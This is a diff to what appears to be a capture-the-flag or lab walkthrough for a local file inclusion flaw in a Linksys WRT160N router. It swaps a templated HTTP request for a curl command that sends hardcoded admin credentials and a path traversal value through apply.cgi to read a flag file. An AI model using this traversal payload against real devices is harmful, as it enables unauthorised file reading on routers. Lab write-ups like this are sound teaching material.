@@ -5,23 +5,8 @@ weight = 5
 +++
 
 ## Local File Inclusion
-Make an HTTP POST request to the router like the following:
+Run the following command to retrieve the flag:
+```sh
+curl --user 'admin:LvawK!*C@6MR!Cz#*V2$ze@#7v75iT' -X POST -d "submit_type=wsc_method2&change_action=gozila_cgi&next_page=../../tmp/flag.txt" http://172.21.0.15:8080/apply.cgi
 ```
-POST /apply.cgi HTTP/1.1
-Host: {TARGET_IP}
-User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-Proxy-Connection: keep-alive
-Authorization: Basic {BASE_64_CREDENTIALS}
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 181
-Connection: close
-
-submit_type=wsc_method2&change_action=gozila_cgi&next_page=../..{FILE}
-```
-**NOTE:** Replace {TARGET_IP}, {BASE_64_CREDENTIALS}, {FILE_TO_READ} with the valid IP, credentials, and file to read respectively
-
-![LFI Request](/static/WRT160N-LFI-Request.png)
-![LFI Response](/static/WRT160N-LFI-Response.png)
+The `next_page` parameter in the request specifies the file we want to read. The content of the file will be returned in the response.
